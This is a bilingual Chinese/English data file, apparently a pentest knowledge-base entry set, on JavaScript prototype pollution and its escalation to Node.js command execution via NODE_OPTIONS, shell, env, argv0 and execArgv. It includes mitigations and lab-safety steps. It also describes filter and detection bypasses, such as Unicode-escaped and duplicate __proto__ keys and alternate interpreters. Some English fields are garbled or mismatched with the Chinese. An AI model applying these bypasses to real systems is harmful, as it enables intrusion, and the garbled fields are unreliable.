vulnerability.en: The root cause is deep-merge, clone, path-set, or query-parsing logic failing to reject dangerous keys like __proto__, prototype, and constructor and writing data to the shared prototype; a same-named field on the input object itself proves nothing—observe an unrelated fresh object inheriting the property.

exploitation.zh: 按第 1 步逐条提交输入样例并记录响应与日志差异：先提交 __proto__ 与 constructor.prototype 两类键路径，检查后续新建对象是否继承注入属性（admin/role 等）；再测试 shell 与 NODE_OPTIONS 变体是否影响子进程创建。命中判据为与输入无关的新对象继承属性，或 execPath/execArgv 变体使子进程执行指定命令。污染确认后再评估具体 gadget，不要把字段回显当成污染证据。
exploitation.en: Submit the input samples one by one per step 1, recording response and log differences: first the __proto__ and constructor.prototype key paths, checking whether subsequently created objects inherit injected properties (admin/role, etc.); then test whether the shell and NODE_OPTIONS variants affect child-process creation. A hit is an unrelated fresh object inheriting the property, or execPath/execArgv variants making a child process execute the specified command. After confirming pollution, assess concrete gadgets—never treat field echo as pollution evidence.

mitigation.zh: 在入口和所有递归层拒绝 __proto__、prototype、constructor 等键；使用维护良好的合并库、schema 校验及 Object.create(null) 存储字典数据；权限与安全配置只读取自有属性并设明确默认值；升级受影响依赖并为跨请求继承添加回归测试。
mitigation.en: Reject keys like __proto__, prototype, and constructor at entry and in every recursion layer; use well-maintained merge libraries, schema validation, and Object.create(null) for dictionary data; read permissions and security configuration from own properties only with explicit defaults; upgrade affected dependencies and add cross-request inheritance regression tests.

name.zh: JavaScript 对象合并原型污染

description.zh: 验证 JSON 或嵌套属性合并是否允许 __proto__ 或 constructor.prototype 改写共享原型，并影响后续授权、DOM 或代码执行 Sink。
description.en: Tests whether JSON or nested-property merging lets __proto__ or constructor.prototype modify a shared prototype and influence later authorization, DOM, or code-execution sinks.

subCategory.zh: 替代语法与查询对象污染

prerequisites.zh: 外部 JSON 或路径键进入不安全 merge/assign，__proto__ 或 constructor.prototype 未被 own-property/schema 校验过滤。
prerequisites.en: External JSON or path keys reach an unsafe merge or assignment where __proto__ or constructor.prototype is not filtered by own-property or schema checks.

prerequisites.zh: 一次性 JavaScript worker 只写唯一 inert marker，并在合并前后记录 Object.prototype、目标构造器和新建对象描述符。
prerequisites.en: A disposable JavaScript worker writes a unique inert marker only and records Object.prototype, target constructors, and new-object descriptors before and after merging.

description.zh: Prototype Pollution包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：原型属性被继承并引发预期行为（innerHTML 注入、NODE_OPTIONS 加载等）。
description.en: Prototype Pollution contains multiple reproducible input samples; test them individually and record response and log differences. Success check: the prototype property is inherited and triggers the intended behavior (innerHTML injection, NODE_OPTIONS loading, and so on).

analysis.zh: 阳性证据是攻击者键污染共享原型，使合并后新建的无关对象继承 marker，并从具体 merge 调用栈和输入字段追溯。 假阳性边界：输入对象自身含 isAdmin/innerHTML、JSON.parse 保留特殊键但未合并、只有目标对象自有属性改变、null prototype 或 shell 字符串存在均不是污染。
analysis.en: Positive evidence requires attacker keys to pollute a shared prototype so a newly created unrelated object inherits the marker, traced to the specific merge stack and input field. False-positive boundary: An input object's own isAdmin or innerHTML, preserved special keys without merging, mutation of only target-owned properties, a null prototype, or a shell string does not prove pollution.

opsecTips.zh: 在一次性隔离 worker 中先以无害哨兵确认污染原语，再逐条验证 isAdmin/innerHTML/env 等 gadget 样例；发现授权变化、DOM 执行、跨请求持久、全局库异常或 worker 不稳定时停止。
opsecTips.en: Prototype-pollution testing never writes business sinks such as isAdmin, innerHTML, or shell; stop on authorization changes, DOM execution, cross-request persistence, global-library anomalies, or worker instability.

opsecTips.zh: 立即销毁污染进程，删除测试对象/marker，清理模块与应用缓存，重启全部隔离 worker 并验证新对象原型恢复。
opsecTips.en: Destroy the polluted process immediately, delete test objects and markers, clear module and application caches, restart all isolated workers, and verify new-object prototypes are restored.

description.zh: 绕过 __proto__ 字面拦截：等价语法污染 Object.prototype。成功判据：全局出现注入属性。
description.en: Bypasses literal __proto__ interception with the equivalent syntax polluting Object.prototype. Success: the injected property appears globally.

description.zh: 分段 Unicode 转义绕过完整 __proto__ 特征但解析后同名。成功判据：解析层命中原型键。
description.en: Segmented Unicode escapes evade the complete __proto__ signature yet resolve to the same key. Success: the parse layer hits the prototype key.

description.zh: 双 __proto__ 键使过滤层取首个丢弃而后个仍被合并。成功判据：任一污染属性生效。
description.en: Duplicate __proto__ keys make the filter drop the first while the second still merges. Success: either polluted property takes effect.

description.zh: 在干净进程中记录空对象、自有属性和递归合并对普通键的预期行为。
description.en: In a clean process, record expected empty-object, own-property, and normal recursive-merge behavior.

description.zh: 提交原始特殊键集合并在新对象上读取唯一 Canary，证明影响不是响应回显。
description.en: Submit the original special-key set and read a unique canary from a new object to prove the effect is not response echo.

description.zh: 分别连接授权、DOM 和进程 Sink，修复特殊键过滤后重启并确认污染与副作用都消失。
description.en: Connect authorization, DOM, and process sinks separately, then restart after special-key filtering and confirm both pollution and side effects disappear.

overview.zh: JavaScript 对象合并原型污染针对 JSON 或嵌套属性合并允许 __proto__ 或 constructor.prototype 改写共享原型的场景。验证 isAdmin、innerHTML、src 与 Node 运行配置等 gadget 链的逐级触发。
overview.en: JavaScript object-merge prototype pollution targets JSON or nested-property merges letting __proto__ or constructor.prototype overwrite the shared prototype. It validates gadget chains—isAdmin, innerHTML, src, and Node runtime configuration—stage by stage.

vulnerability.zh: 易受影响的递归合并、路径赋值或反序列化逻辑未拒绝 __proto__、prototype 和 constructor 等特殊键，导致攻击者把属性写入 Object.prototype 或自定义构造器原型；污染本身与可利用 gadget 是两个独立证据阶段。
vulnerability.en: Vulnerable recursive merges, path assignment, or deserialization logic fail to reject special keys like __proto__, prototype, and constructor, letting attackers write properties to Object.prototype or custom constructor prototypes; pollution itself and exploitable gadgets are two independent evidence stages.

exploitation.zh: 按第 1 步逐条提交样例：先以 isAdmin 变体确认共享原型被改写且目标对象继承该值；再测 innerHTML 与 src 是否进入 DOM 或脚本 Sink；Node 环境测 NODE_OPTIONS 等 gadget。命中判据为继承属性引发预期行为。先证污染原语，再逐个验证 gadget，两级证据分开归档。
exploitation.en: Submit samples one by one per step 1: first confirm with the isAdmin variants that the shared prototype is overwritten and target objects inherit the value; then test whether innerHTML and src reach DOM or script sinks; in Node, test NODE_OPTIONS-style gadgets. A hit is inherited properties producing expected behavior. Prove the pollution primitive first, then verify gadgets one by one, archiving the two evidence stages separately.

mitigation.zh: 在所有对象路径入口拒绝 __proto__、prototype 和 constructor；使用无原型对象、Map 或经过审计的安全合并库；授权判断只读取自有属性并采用显式 Schema。修复后重放第 1 步全部变体，并为污染源与每个 gadget 分别建立回归测试。
mitigation.en: Reject __proto__, prototype, and constructor at every object-path entry; use prototype-less objects, Map, or audited safe merge libraries; read authorization decisions from own properties only with explicit schemas. After the fix, replay all step-1 variants and build separate regression tests for the pollution source and each gadget.

name.zh: Node.js 原型污染到进程选项
name.en: Node.js Prototype Pollution to Process Options

description.zh: 通过 __proto__ 或 constructor.prototype 注入 shell、env、NODE_OPTIONS、argv0 与 execArgv，验证污染属性是否流入子进程创建选项。
description.en: Injects shell, env, NODE_OPTIONS, argv0, and execArgv through proto or constructor.prototype to test whether polluted properties flow into child-process options.

subCategory.zh: 污染利用链到 RCE 与客户端

prerequisites.zh: 已定位“Node.js 原型污染到进程选项”的对象合并入口和子进程 sink，并确认：攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键。
prerequisites.en: The object-merge entry and child-process sink for Node.js Prototype Pollution to Process Options are identified, and an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation.

prerequisites.zh: 每个用例在一次性新 Node worker 中运行，可连续观察：污染前后对象的属性所有权、最终传给 child_process 的选项、以及一次性固定进程标记是否出现。
prerequisites.en: Each case runs in a fresh Node worker and can observe property ownership, final options, and property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable.

title.en: Validation step 1 for Node.js Prototype Pollution to Process Options

description.zh: Node.js原型污染RCE包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：污染属性被子进程选项继承并执行指定模块或命令。
description.en: Run this Node.js Prototype Pollution to Process Options validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: the polluted property is inherited by child-process options and runs the given module or command.

analysis.zh: 阳性必须依次证明污染写入、继承属性读取、进程选项消费和污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见。JSON 被接受、原型有哨兵但 sink 未读取、或自有属性覆盖污染值均是假阳性，不能证明“对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用”。
analysis.en: A positive proves pollution write, inherited read, process-option consumption, and property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable. Accepted JSON, an unconsumed prototype sentinel, or an owned property overriding pollution are false positives and do not prove whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers.

opsecTips.zh: 在一次性隔离 worker 中先以无害哨兵和固定 echo 验证，再逐条重放子进程选项样例（命令一律换成固定 echo）；污染进入共享主进程、真实 env/NODE_OPTIONS 或并行请求时，立即终止整个实例。本条重点观察对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用。
opsecTips.en: Node.js Prototype Pollution to Process Options stop condition: Use harmless sentinels and fixed echo only; terminate the instance if pollution reaches the shared process, real env or NODE_OPTIONS, or concurrent requests. The entry-specific focus is whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers.

opsecTips.zh: 每个 JSON 用例后销毁 worker；全部完成后重启应用，确认 Object.prototype 无残留哨兵属性并清空队列与缓存。
opsecTips.en: Node.js Prototype Pollution to Process Options cleanup condition: Destroy the worker after each JSON; restart the app, verify Object.prototype has no sentinel, and clear queues and caches. Recheck that no triggerable state remains for this technique.

description.zh: 绕过对 child_process 显式注入 env 的检测：污染 NODE_OPTIONS 使后续任意 node 调用自动预载载荷。成功判据：下次进程派生时载荷执行。
description.en: Evades detection of explicit env injection into child_process by polluting NODE_OPTIONS so any later node invocation preloads the payload. Success: the payload executes on the next process spawn.

description.zh: 绕过仅监控 /bin/bash 注入的规则：换 shell 解释器路径等价达成命令执行。成功判据：派生命令经指定解释器执行。
description.en: Evades rules watching only /bin/bash injection by switching to an equivalent interpreter path. Success: spawned commands execute through the specified shell.

description.zh: 以 argv0+env 组合替代显式 shell 字段绕过字段级检测。成功判据：组合注入使命令执行成功。
description.en: Using argv0+env instead of an explicit shell field bypasses field-level detection. Success: the combined injection achieves command execution.

description.zh: 使用无害哨兵键验证污染来源、对象所有权与清理范围，核对前提“攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键”。
description.en: Use a harmless sentinel to verify pollution source, ownership, and cleanup scope, confirming that an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation.

description.zh: 断点记录 shell、env、argv0 与 execArgv 的最终值和属性所有权，以“污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见”作为完整链路证据。
description.en: Record final shell, env, argv0, and execArgv values plus ownership, using property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable as full-chain evidence.

title.zh: 隔离重放“Node.js 原型污染到进程选项”JSON
title.en: Replay Node.js Prototype Pollution to Process Options JSON in isolation

description.zh: 测试步骤为：先污染无害哨兵属性并检查 Object.hasOwn，再在隔离 worker 中验证选项传播；每个 JSON 变体都在新 worker 中单独重放，并以固定 echo 替代真实系统动作。
description.en: pollute a harmless sentinel property and inspect Object.hasOwn first, then validate option propagation with fixed echo in an isolated worker, replaying each JSON variant separately. Run each JSON in a fresh worker and replace system behavior with fixed echo.

title.zh: 拒绝危险键并显式构造选项
title.en: Reject dangerous keys and build options explicitly

description.zh: 实施“拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv”后重放合法对象与所有污染变体，确认合并功能保留且继承属性不进入进程 API。
description.en: Apply reject proto, prototype, and constructor keys, use null-prototype objects and schema allowlists, check own properties, and explicitly construct env and execArgv before process creation, replay valid objects and pollution variants, and preserve merging without inherited process options.

overview.zh: Node.js 原型污染到进程选项针对污染属性流入子进程创建选项的场景：shell、env、NODE_OPTIONS、argv0 与 execArgv 均可被注入。验证污染写入到子进程行为改变的完整证据链。
overview.en: Node.js prototype pollution to process options targets polluted properties flowing into child-process creation options: shell, env, NODE_OPTIONS, argv0, and execArgv are all injectable. It validates the full evidence chain from pollution write to child-process behavior change.

vulnerability.zh: 根因是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键，污染属性可能沿普通对象默认值传播到 shell、env 或 execArgv 读取点。
vulnerability.en: The root cause is attackers polluting Object.prototype while the application later builds child-process options from plain objects without verifying own properties, types, or allowed keys, letting polluted properties propagate into shell, env, or execArgv read points along plain-object defaults.

exploitation.zh: 按第 1 步逐条提交 __proto__ 注入 shell/NODE_OPTIONS、env、argv0/execArgv 的 JSON 变体并记录响应与日志差异；命中判据为污染属性被子进程选项继承并执行指定模块或命令。验证顺序：先确认污染写入（新对象继承属性），再确认传给 child_process 的最终选项，最后以一次性固定进程标记确认执行；每步都排除对象自有属性与应用显式配置的干扰。
exploitation.en: Per step 1, submit the __proto__ JSON variants injecting shell/NODE_OPTIONS, env, and argv0/execArgv one by one, recording response and log differences; a hit is polluted properties inherited into child-process options executing the specified module or command. Validate in order: confirm the pollution write (fresh objects inherit the property), then the final options passed to child_process, then execution via a one-shot fixed process marker; exclude own-property and explicit-application-configuration interference at every step.

mitigation.zh: 拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv。修复后重放合法嵌套对象、三个危险键和原始选项变体，确认所有子进程选项只来自显式自有属性。
mitigation.en: Reject __proto__/prototype/constructor keys, use prototype-less objects with schema allowlists, check own properties before reading child-process options, and construct env and execArgv explicitly. After the fix, replay legitimate nested objects, the three dangerous keys, and original option variants, confirming all child-process options come only from explicit own properties.
